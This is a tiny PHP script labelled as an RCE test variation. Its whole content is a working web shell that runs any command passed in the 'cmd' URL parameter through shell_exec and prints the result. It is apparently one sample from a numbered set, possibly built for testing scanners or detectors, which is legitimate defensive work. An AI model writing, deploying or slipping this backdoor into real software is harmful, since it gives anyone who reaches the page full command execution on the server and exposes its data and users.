<?php
// RCE test variation #564
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>